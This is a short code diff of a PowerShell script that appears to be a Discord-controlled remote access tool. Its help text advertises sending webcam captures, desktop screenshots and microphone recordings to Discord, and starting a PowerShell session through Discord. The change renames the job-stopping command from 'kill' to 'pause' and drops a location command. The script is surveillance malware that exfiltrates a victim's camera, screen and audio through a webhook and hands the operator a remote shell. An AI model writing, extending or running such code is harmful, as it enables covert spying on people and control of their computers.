@@ -260,8 +260,8 @@ Function quickInfo{
 - **Webcam**                : Send webcam screenshots to Discord
 - **Screenshot**            : Send Desktop screenshots to Discord
 - **Audio**                 : Record Microphone clips to Discord
-- **Location**              : Get Machine Location
 - **PSconsole**             : Start Powershell Session in Discord
+- **Pause**                 : Pause all running jobs
 - **Close**                 : Close this session
 
 "@
@@ -557,7 +557,7 @@ while ($true) {
                 sendMsg -Message ":no_entry: ``Already Running!`` :no_entry:" -webhook $webhook
             }
         }
-        if ($messages -eq 'kill'){
+        if ($messages -eq 'pause'){
             Stop-Job -Name Audio
             Stop-Job -Name Screen
             Stop-Job -Name Webcam
